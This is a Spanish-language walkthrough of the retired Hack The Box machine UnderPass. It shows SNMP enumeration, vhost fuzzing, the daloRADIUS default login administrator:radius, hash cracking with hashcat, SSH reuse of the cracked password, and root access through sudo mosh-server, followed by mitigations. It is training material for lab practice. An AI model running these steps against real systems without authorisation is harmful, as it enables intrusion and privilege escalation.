---
machine: UnderPass
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, snmp, daloradius, default-credentials, mosh, privesc]
---

# UnderPass — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

SNMP con comunidad pública revela un servidor daloRADIUS y su página de login. Las credenciales por defecto dan acceso y exponen el hash de `svcMosh`, que se crackea y funciona por SSH. `svcMosh` puede ejecutar `mosh-server` como root; se lanza el servidor, se usa el `MOSH_KEY` y se conecta con `mosh-client` para obtener root.

## Reconocimiento

```bash
nmap -Pn -sU -p161 <IP>
nmap -Pn -sCV -p22,80 <IP>
```

- `161/udp` SNMP y `22` SSH; la web no está en 80.
- `snmpwalk -v2c -c public <IP>` enumera procesos, interfaces y cadenas.
- La salida menciona daloRADIUS y una ruta `/daloradius`.

## Enumeración

- El portal daloRADIUS está en un vhost o puerto interno.
- `feroxbuster` o `ffuf` confirman `/daloradius/login.php`.
- Las credenciales por defecto `administrator:radius` dan acceso.

```bash
snmpwalk -v2c -c public <IP>
ffuf -u http://<IP>/ -H 'Host: FUZZ.underpass.htb' -w subdomains.txt
```

## Foothold

En daloRADIUS, la tabla de usuarios muestra el hash de `svcMosh`. Es un hash conocido; se crackea y la contraseña funciona por SSH. El usuario tiene `user.txt`.

```bash
hashcat -m 0 hash.txt rockyou.txt
ssh svcMosh@<IP>
```

## Movimiento lateral

`svcMosh` no tiene acceso directo a root, pero puede ejecutar `mosh-server` como cualquier usuario sin contraseña.

```bash
sudo -l
```

## Escalada de privilegios

Se lanza `mosh-server` como root y se obtiene un `MOSH CONNECT <PORT> <KEY>`. `mosh-client` necesita `MOSH_KEY`; con él se abre una sesión root en localhost.

```bash
sudo mosh-server
MOSH_KEY=<KEY> mosh-client 127.0.0.1 <PORT>
```

## Evidencia

- SNMP público y daloRADIUS.
- Credenciales por defecto.
- Hash de `svcMosh` crackeado.
- Regla de `mosh-server` como root.
- `MOSH_KEY` y sesión root.

## Lecciones aprendidas

- SNMP con comunidad pública filtra servicios internos.
- Las credenciales por defecto de daloRADIUS siguen siendo habituales.
- Un hash débil se crackea y se reutiliza en SSH.
- `mosh-server` como root permite iniciar una sesión privilegiada en localhost.

## Mitigación y detección

- Cambiar la comunidad SNMP y restringir 161/udp.
- Cambiar credenciales por defecto y limitar daloRADIUS.
- Usar contraseñas fuertes y únicas; no reutilizar en SSH.
- No permitir `mosh-server` como root y auditar las reglas de sudo.

## Referencias

- [0xdf — UnderPass](https://0xdf.gitlab.io/2025/05/10/htb-underpass.html)
- [IppSec — UnderPass](https://www.youtube.com/watch?v=6hoOcB9ubs8)
- [Hack The Box — UnderPass](https://app.hackthebox.com/machines/underpass)
